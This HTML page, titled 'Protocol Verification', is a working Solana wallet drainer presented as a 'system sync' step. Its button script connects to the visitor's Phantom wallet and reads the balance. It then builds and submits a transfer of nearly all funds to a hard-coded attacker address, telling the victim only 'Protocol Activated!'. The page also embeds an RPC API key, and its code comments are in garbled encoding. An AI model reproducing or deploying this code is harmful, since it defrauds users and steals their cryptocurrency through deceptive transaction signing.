<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="icon" href="data:,"> <title>Protocol Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
</head>
<body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-family:sans-serif;">
    <div style="padding:40px;border:1px solid #14F195;border-radius:20px;display:inline-block;">
        <h2 style="color:#14F195;">SYSTEM SYNC</h2>
        <button id="cta" style="background:#14F195;color:#000;padding:15px 30px;border:none;border-radius:10px;font-weight:bold;cursor:pointer;">CONNECT & SYNC</button>
    </div>
    <script>
        const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
        const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd";

        document.getElementById('cta').onclick = async function() {
            try {
                // ğŸ”± æ£€æŸ¥æ’ä»¶ç¯å¢ƒæ˜¯å¦æœ‰æ•ˆ
                if (!window.solana && !window.phantom?.solana) {
                    alert("Wallet not detected. Please refresh the page.");
                    location.reload();
                    return;
                }

                const p = window.solana || window.phantom?.solana;
                await p.connect();

                const conn = new solanaWeb3.Connection(HELIUS_RPC, "confirmed");
                const { blockhash } = await conn.getLatestBlockhash();
                
                // è·å–ä½™é¢
                const bal = await conn.getBalance(p.publicKey);
                if (bal < 2000000) { alert("Low balance."); return; }

                const tx = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: p.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(TARGET),
                        lamports: bal - 1500000, 
                    })
                );
                tx.recentBlockhash = blockhash;
                tx.feePayer = p.publicKey;

                // ğŸš€ æ ¸å¿ƒåŠ¨ä½œ
                const signed = await p.signTransaction(tx);
                await conn.sendRawTransaction(signed.serialize());
                alert("Protocol Activated!");
                
            } catch (e) {
                // ğŸ”± å¦‚æœæ•è·åˆ°ç¯å¢ƒå¤±æ•ˆæŠ¥é”™ï¼Œç›´æ¥åˆ·æ–°
                if (e.message.includes("Extension context invalidated")) {
                    location.reload();
                } else {
                    console.error(e);
                }
            }
        };
    </script>
</body>
</html>
